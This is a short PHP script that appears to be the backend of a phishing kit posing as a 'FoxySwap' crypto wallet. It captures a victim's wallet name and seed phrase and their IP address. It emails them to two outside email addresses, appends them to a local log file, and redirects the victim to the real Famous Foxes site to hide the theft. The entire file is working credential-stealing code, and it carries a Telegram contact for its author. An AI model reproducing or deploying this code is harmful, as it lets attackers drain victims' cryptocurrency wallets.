<?php
$Cashout = getenv("REMOTE_ADDR");
$subject = "FoxySwap [ " . $Cashout . " ] /";
$headers = "From: Hacker0X01 <service>\r\n";
$message .= "
+----/!\----<.![+] FoxySwap Wallet  [+]!.>---/!\----+
 [wallet name ]           : ".$_POST['wallet']."
 [Seed Phase]           : ".$_POST['seed']."
-------------------------------------------------
-------------------------------------------------
+----/!\----<.![+] IP GEOINFO  [+]!.>---/!\----+
 [IP] :  http://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."\n
 ---- CONTACT US NOW 👇🏻  ----\n
✨ TELEGRAM:  @mr_coder_x1
\n";
mail('full_2033@protonmail.com',$subject,$message,$headers);
mail('royssupreme@gmail.com',$subject,$message,$headers);
$text = fopen('./rezlt.txt', 'a');
fwrite($text, $message);

header("Location: https://famousfoxes.com/");
?>

